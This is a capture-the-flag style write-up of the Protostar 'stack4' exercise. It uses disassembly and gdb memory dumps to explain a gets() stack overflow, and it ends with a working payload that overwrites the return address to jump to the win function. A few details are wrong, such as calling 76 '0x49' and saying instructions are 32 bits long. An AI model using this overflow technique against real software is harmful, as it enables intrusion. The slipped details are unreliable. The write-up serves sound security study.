# For Stack4 of Protostar

Ignoring the fact that the name is Stack4, the program disassembly (see below) looks like there's a stack overflow vulnerability. So I tested out the program.
```
user@protostar:/opt/protostar/bin$ ./stack4
aaaaabbbbb
user@protostar:/opt/protostar/bin$ ./stack4
aaaaaaaaabbbbbbbbbbccccccccccddddddddddeeeeeeeeeeffffffffffgggggggggghhhhhhhhhhiiiiiiiiiiijjjjjjjjjj
Segmentation fault
```
*"Segmentation fault"* tells me that an address which should not be accessed is being accessed.

## Disassembly
Let's take a look at the disassembly. 
```
080483f4 <win>:
 80483f4:       55                      push   ebp
 80483f5:       89 e5                   mov    ebp,esp
 80483f7:       83 ec 18                sub    esp,0x18
 80483fa:       c7 04 24 e0 84 04 08    mov    DWORD PTR [esp],0x80484e0
 8048401:       e8 26 ff ff ff          call   804832c <puts@plt>    ;"code flow successfully changed"
 8048406:       c9                      leave
 8048407:       c3                      ret

08048408 <main>:
 8048408:       55                      push   ebp
 8048409:       89 e5                   mov    ebp,esp          ; ebp = esp = 0xbffff7b8
 804840b:       83 e4 f0                and    esp,0xfffffff0   ; esp = 0xbffff7b0
 804840e:       83 ec 50                sub    esp,0x50         ; esp = 0xbffff760
 8048411:       8d 44 24 10             lea    eax,[esp+0x10]
 8048415:       89 04 24                mov    DWORD PTR [esp],eax
 8048418:       e8 ef fe ff ff          call   804830c <gets@plt>
 804841d:       c9                      leave
 804841e:       c3                      ret
 804841f:       90                      nop
```  
Converting the functions `win` and `main` into pseudocode,

><win>
>This function simply prints the string stored in address 0x80484e0.
>That string is; "code flow successfully changed".
> 
><main>
>Assign eax the result of calculating `$esp+0x10`. 
>Move that value to the top of the stack.
>`gets()` gets a string from `stdin` and stores it in the memory address specified by the top of the stack.
>ret pops whatever value is on the stack back into the `eip`.

## Analysing program execution
I use gdb to execute the program to see whether it really executes the way I guessed.
```
(gdb) start
Temporary breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
Starting program: /opt/protostar/bin/stack4
```
#### Before gets()
These are the register and memory values before `gets()` is called.
```
(gdb) si
0x08048415      15      in stack4/stack4.c
0x08048415 <main+13>:    89 04 24       mov    DWORD PTR [esp],eax
0x08048418 <main+16>:    e8 ef fe ff ff call   0x804830c <gets@plt>
(gdb) info registers
eax            0xbffff770       -1073744016
ecx            0xffd699da       -2713126
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7b8       0xbffff7b8
esi            0x0      0
edi            0x0      0
eip            0x8048415        0x8048415 <main+13>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/50x 0xbffff760
0xbffff760:     0xb7fd7ff4      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0xb7fd7ff4      0x080495ec      0xbffff788      0x080482e8
0xbffff780:     0xb7ff1040      0x080495ec      0xbffff7b8      0x08048449
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffff7b0:     0x08048430      0x00000000      0xbffff838      0xb7eadc76
0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x0804824b
0xbffff7e0:     0x00000001      0xbffff820      0xb7ff0626      0xb7fffab0
0xbffff7f0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff800:     0xbffff838      0xd5816fca      0xffd699da      0x00000000
0xbffff810:     0x00000000      0x00000000      0x00000001      0x08048340
0xbffff820:     0x00000000      0xb7ff6210
```
#### Stack frame
This below is the stack frame for `<main>`. 
- The top of the stack is *0xbffff760*, and lasts until *0xbffff7b7* (ebp is *0xbffff7b8*)
- User input read by `get()` is stored from *0xbffff770* onwards.
- The return address from `main()` is in address *0xbffff7b8*
```
0xbffff760:     0xb7fd7ff4      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0xb7fd7ff4      0x080495ec      0xbffff788      0x080482e8
0xbffff780:     0xb7ff1040      0x080495ec      0xbffff7b8      0x08048449
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffff7b0:     0x08048430      0x00000000      ebp_of_caller   return_addr
```
#### After gets()
These are the register and memory values after `gets()` was called, and I gave an input.
```
(gdb) ni
0x08048418      15      in stack4/stack4.c
0x08048418 <main+16>:    e8 ef fe ff ff call   0x804830c <gets@plt>
(gdb)
aaaaaaaaaabbbbbbbbbbccccccccccddddddddddeeeeeeeeeeffffffffffgggggggggghhhhhhhhhhiiiiiiiiiijjjjjjjjjj
16      in stack4/stack4.c
0x0804841d <main+21>:    c9     leave
0x0804841e <main+22>:    c3     ret
(gdb) x/50x 0xbffff760
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x61616161      0x61616161      0x62626161      0x62626262
0xbffff780:     0x62626262      0x63636363      0x63636363      0x64646363
0xbffff790:     0x64646464      0x64646464      0x65656565      0x65656565
0xbffff7a0:     0x66666565      0x66666666      0x66666666      0x67676767
0xbffff7b0:     0x67676767      0x68686767      0x68686868      0x68686868
0xbffff7c0:     0x69696969      0x69696969      0x6a6a6969      0x6a6a6a6a
0xbffff7d0:     0x6a6a6a6a      0xffffff00      0xb7ffeff4      0x0804824b
0xbffff7e0:     0x00000001      0xbffff820      0xb7ff0626      0xb7fffab0
0xbffff7f0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff800:     0xbffff838      0xd5816fca      0xffd699da      0x00000000
0xbffff810:     0x00000000      0x00000000      0x00000001      0x08048340
0xbffff820:     0x00000000      0xb7ff6210
```
The output tells us two things
1. Our input changed the return address of `main` (ie address that `main` returns to) to *0x68686868*.
2. Our input changed the `ebp` of the function that called main to *0x68686868*. "Why?", you may ask. Recall that when a new function is called, a new stack frame is created. The `ebp` of the new stack frame is the `esp` of the old one. So, the `ebp` of the old stack frame is pushed to the stack for safe keeping until the new stack frame is removed (ie when the function returns to the caller).

So, when `0x804841d: c9    leave` was executed, the program tried to pop the value of the old `ebp` (which has been overwritten by our input) from the stack into the register `ebp`. 
```
(gdb) ni
0x0804841e in main (argc=Cannot access memory at address 0x68686870) at stack4/stack4.c:16
16      in stack4/stack4.c
0x0804841e <main+22>:    c3     ret

(gdb) info registers
eax            0xbffff770       -1073744016
ecx            0xbffff770       -1073744016
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7bc       0xbffff7bc
ebp            0x68686868       0x68686868
esi            0x0      0
edi            0x0      0
eip            0x804841e        0x804841e <main+22>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

Moving on to the next instruction, we execute `ret`. This pops the stack into the `eip`. The top of the stack is address *0xbffff7bc*, and contains the value *0x68686868*. `eip` is now given the value *0x68686868*. Because instructions are 32bits in size, the next instruction that is supposed to be executed is at location *0x6868686c*. Whoops! That memory address is not accessible (hence the *segmentation fault*).
```
(gdb) ni
Cannot access memory at address 0x6868686c
(gdb) p/x $eip
$1 = 0x68686868
```

## Winning strategy and input
Using stackoverflow, we can redirect program execution. So our goal in thid program is to overwrite the ret address with the address of `<win>`, and once the `<main>` function returns, it “returns” to `<win>`.

The address of `<win>`, *0x080483f4*, is at the end of the string literal (see below). We overflow the stack with 76 (ie 0x49) 'a' characters.
```
\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xf4\x83\x04\x08
```
Refer to the stack frame to see why I had 76 'a' characters instead of 80 (naturally people assume it should be 80 because of the instruction `804840e:  sub  esp,0x50 `). Counting by hand may help.

Running the input in the actual program, and we achieve our goal.
```
user@protostar:/opt/protostar/bin$ cat ~/stack4input | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ 
```
END
